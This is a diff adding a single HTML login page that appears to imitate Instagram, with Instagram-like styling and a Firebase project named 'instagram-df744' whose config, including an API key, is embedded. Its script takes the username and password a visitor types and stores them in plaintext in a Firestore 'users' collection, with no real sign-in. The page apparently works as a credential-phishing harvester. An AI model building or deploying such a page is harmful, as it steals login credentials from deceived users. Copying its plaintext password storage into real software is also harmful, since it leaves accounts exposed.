@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        form {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 300px;
+            text-align: center;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+        }
+
+        label {
+            display: none;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+        }
+
+        button[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 3px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #007bb5;
+        }
+    </style>
+</head>
+<body>
+    <form id="loginForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username">
+        <br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password">
+        <br>
+        <button type="submit">Submit</button>
+    </form>
+
+    <!-- Firebase App (ESモジュールとしてロード) -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCMjppxsT4pSd69N9gIRw_pdvWIHiF1yy4",
+            authDomain: "instagram-df744.firebaseapp.com",
+            projectId: "instagram-df744",
+            storageBucket: "instagram-df744.firebasestorage.app",
+            messagingSenderId: "326940421472",
+            appId: "1:326940421472:web:1a504873cdcc44a1840205",
+            measurementId: "G-DDQ9SEHTLP"
+        };
+
+        // Firebaseの初期化
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // フォームの送信イベントリスナー
+        document.getElementById('loginForm').addEventListener('submit', async function (e) {
+            e.preventDefault(); // フォームのデフォルト動作を停止
+
+            // 入力値の取得
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                // Firestoreにデータを追加
+                const docRef = await addDoc(collection(db, "users"), {
+                    username: username,
+                    password: password
+                });
+                alert('Data saved successfully!');
+                console.log("Document written with ID: ", docRef.id);
+            } catch (e) {
+                console.error("Error adding document: ", e);
+                alert('Error saving data');
+            }
+        });
+    </script>
+</body>
+</html>
